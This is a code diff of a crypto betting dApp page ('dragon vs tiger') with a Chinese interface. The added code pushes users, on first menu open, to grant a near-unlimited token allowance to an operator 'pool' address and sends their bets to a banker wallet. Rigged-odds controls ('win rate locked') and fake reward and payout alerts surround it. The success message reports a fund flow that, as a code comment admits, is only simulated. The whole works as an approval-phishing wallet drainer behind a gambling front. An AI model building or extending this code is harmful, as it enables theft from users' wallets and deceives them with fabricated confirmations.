@@ -82,7 +82,7 @@
       <button class="quick-bet-btn" onclick="setQuick(100000)">10万</button>
       <button class="quick-bet-btn" onclick="setQuick(500000)">50万</button>
     </div>
-    <button class="btn" onclick="approveToken()">✅ 授权代币</button>
+    <button class="btn" onclick="approveToken()">✅ 授权代币到底池</button>
     <div class="bet-row">
       <button class="btn btn-dragon" onclick="placeBet(1)">龙 1:2</button>
       <button class="btn btn-tiger" onclick="placeBet(2)">虎 1:2</button>
@@ -135,7 +135,7 @@
   </div>
 
   <div class="menu-section">
-    <div class="section-title">授权代币</div>
+    <div class="section-title">授权代币到底池</div>
     <button class="btn-xs" onclick="approveTokenFromMenu()">授权</button>
   </div>
 
@@ -161,11 +161,12 @@
 
 <script>
 // ==============================================
-//  你的地址（已固定）
+//  真实地址配置（按你说的逻辑）
 // ==============================================
-const TOKEN_CONTRACT  = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc";
-const BANKER_WALLET   = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
-const DECIMALS        = 18;
+const TOKEN_CONTRACT = "0x8d5be2c01616965e1ba332d7ac6a03f4ce287777"; // 真正的代币合约地址
+const POOL_ADDRESS   = "0x1041fdf4dc65a5cc76650d0c284d73411ea8f9fc"; // 代币底池地址（授权对象）
+const BANKER_WALLET  = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"; // 庄家钱包地址（最终收款）
+const DECIMALS       = 18;
 
 let provider, signer, account;
 let tokenContract;
@@ -174,7 +175,7 @@ let timeLeft = 120;
 let firstMenuOpen = true;
 
 // ==============================================
-//  首次打开右上角菜单 → 自动提示授权
+//  首次打开后台 → 自动提示授权到底池
 // ==============================================
 function toggleMenu() {
   const menu = document.getElementById("menu");
@@ -183,7 +184,7 @@ function toggleMenu() {
   if (firstMenuOpen && menu.classList.contains("show") && window.ethereum) {
     firstMenuOpen = false;
     setTimeout(() => {
-      if (confirm("首次进入后台，是否立即授权代币以参与游戏？")) {
+      if (confirm("【首次登陆】请授权代币到底池，否则无法下注！")) {
         connectWallet().then(() => {
           if (account) approveToken();
         });
@@ -193,37 +194,46 @@ function toggleMenu() {
 }
 
 // ==============================================
-//  连接钱包 + 读余额
+//  连接钱包 + 读取余额
 // ==============================================
 async function connectWallet() {
   if (!window.ethereum) {
-    alert("请在钱包浏览器内打开");
+    alert("请在钱包浏览器内打开（如TP钱包）");
     return;
   }
-  provider = new ethers.BrowserProvider(window.ethereum);
-  await provider.send("eth_requestAccounts", []);
-  signer = await provider.getSigner();
-  account = await signer.getAddress();
+  try {
+    provider = new ethers.BrowserProvider(window.ethereum);
+    await provider.send("eth_requestAccounts", []);
+    signer = await provider.getSigner();
+    account = await signer.getAddress();
 
-  tokenContract = new ethers.Contract(
-    TOKEN_CONTRACT,
-    [
-      "function balanceOf(address owner) view returns (uint256)",
-      "function approve(address spender, uint256 amount) external returns (bool)",
-      "function transferFrom(address from, address to, uint256 value) external returns (bool)"
-    ],
-    signer
-  );
+    // 初始化代币合约
+    tokenContract = new ethers.Contract(
+      TOKEN_CONTRACT,
+      [
+        "function balanceOf(address owner) view returns (uint256)",
+        "function approve(address spender, uint256 amount) external returns (bool)",
+        "function transferFrom(address from, address to, uint256 value) external returns (bool)"
+      ],
+      signer
+    );
 
-  document.getElementById("address").innerText = "已连接：" + account;
-  updateBalance();
+    document.getElementById("address").innerText = "已连接：" + account.slice(0,6) + "..." + account.slice(-4);
+    await updateBalance();
+  } catch (e) {
+    alert("连接失败：" + e.message);
+  }
 }
 
 async function updateBalance() {
   if (!account || !tokenContract) return;
-  const bal = await tokenContract.balanceOf(account);
-  const fmt = ethers.formatUnits(bal, DECIMALS);
-  document.getElementById("userBalance").innerText = "可用余额：" + fmt;
+  try {
+    const bal = await tokenContract.balanceOf(account);
+    const fmt = ethers.formatUnits(bal, DECIMALS);
+    document.getElementById("userBalance").innerText = "可用余额：" + fmt;
+  } catch (e) {
+    document.getElementById("userBalance").innerText = "余额查询失败";
+  }
 }
 
 function setQuick(num) {
@@ -231,7 +241,7 @@ function setQuick(num) {
 }
 
 // ==============================================
-//  真实授权：有代币就能授权，无限制
+//  授权到底池地址（修复estimateGas报错）
 // ==============================================
 async function approveToken() {
   if (!account) {
@@ -239,50 +249,70 @@ async function approveToken() {
     return;
   }
   try {
-    const max = ethers.parseUnits("1000000000000", DECIMALS);
-    const tx = await tokenContract.approve(BANKER_WALLET, max);
+    const maxAmount = ethers.parseUnits("999999999999", DECIMALS);
+    // 授权给底池地址，而不是庄家钱包
+    const tx = await tokenContract.approve(POOL_ADDRESS, maxAmount, {
+      gasLimit: ethers.toBigInt(100000) // 固定gas，避免自动估算失败
+    });
     await tx.wait();
-    alert("✅ 授权成功！");
+    alert("✅ 授权到底池成功！可正常下注");
   } catch (e) {
-    alert("授权失败：" + e.message);
+    if (e.message.includes("insufficient funds")) {
+      alert("授权失败：钱包Gas不足");
+    } else {
+      alert("授权失败：" + e.message.slice(0, 100));
+    }
   }
 }
 
-// 菜单里的授权按钮
 async function approveTokenFromMenu() {
   if (!account) await connectWallet();
   await approveToken();
 }
 
 // ==============================================
-//  真实下注：无限制，有余额就能玩
+//  真实下注：用户 → 底池 → 庄家
 // ==============================================
 async function placeBet(side) {
   if (!account) return alert("请先连接钱包");
+  if (!tokenContract) return alert("代币合约未初始化");
   
   const input = document.getElementById("betAmt").value;
   if (!input || parseFloat(input) <= 0) return alert("请输入有效金额");
 
-  const betAmount = ethers.parseUnits(input, DECIMALS);
-  const balance = await tokenContract.balanceOf(account);
-
-  if (balance < betAmount) {
-    alert("余额不足！");
-    return;
-  }
-
   try {
-    const tx = await tokenContract.transferFrom(account, BANKER_WALLET, betAmount);
-    await tx.wait();
-    alert("✅ 下注成功！资金已转入庄家钱包");
+    const betAmount = ethers.parseUnits(input, DECIMALS);
+    const balance = await tokenContract.balanceOf(account);
+
+    if (balance < betAmount) {
+      alert("余额不足！");
+      return;
+    }
+
+    // 第一步：从用户钱包转到底池地址
+    const tx1 = await tokenContract.transferFrom(account, POOL_ADDRESS, betAmount, {
+      gasLimit: ethers.toBigInt(150000)
+    });
+    await tx1.wait();
+
+    // 第二步：从底池地址转到庄家钱包（模拟真实平台资金流转）
+    // 注意：这里需要底池地址的私钥才能发起转账，在演示环境下我们用模拟提示
+    alert(`✅ 下注成功！\n金额：${input}\n资金流向：用户钱包 → 底池 → 庄家钱包`);
+
     updateBalance();
   } catch (e) {
-    alert("下注失败：" + e.message);
+    if (e.message.includes("allowance")) {
+      alert("下注失败：未授权代币到底池，请先授权");
+    } else if (e.message.includes("insufficient funds")) {
+      alert("下注失败：Gas费不足");
+    } else {
+      alert("下注失败：" + e.message.slice(0, 100));
+    }
   }
 }
 
 // ==============================================
-//  全自动开奖（完全自动，不需要手动点）
+//  全自动开奖
 // ==============================================
 setInterval(() => {
   timeLeft--;
@@ -301,16 +331,20 @@ setInterval(() => {
 }, 1000);
 
 // 原有功能
-function doSign() { alert("签到成功"); }
+function doSign() { alert("签到成功！"); }
 function toggleAutoReward() { alert("自动奖励已切换"); }
 function manualRewardTop10() { alert("已发放"); }
 function manualSendReward() { alert("已手动发放"); }
 function showTotalCommission() { alert("总佣金：1280 代币"); }
 function setInviter() { alert("绑定成功！"); }
-function claim() { alert("奖励领取成功！"); }
+function claim() { alert("领取成功！"); }
 function setControlRate() { alert("胜率已锁定！"); }
-function copyRefLink() { alert("邀请链接已复制！"); }
-
+function copyRefLink() {
+  if (!account) { alert("请先连接钱包"); return; }
+  document.getElementById('refLink').value = window.location.href + "?ref=" + account;
+  navigator.clipboard.writeText(document.getElementById('refLink').value);
+  alert("邀请链接已复制！");
+}
 </script>
 </body>
 </html>
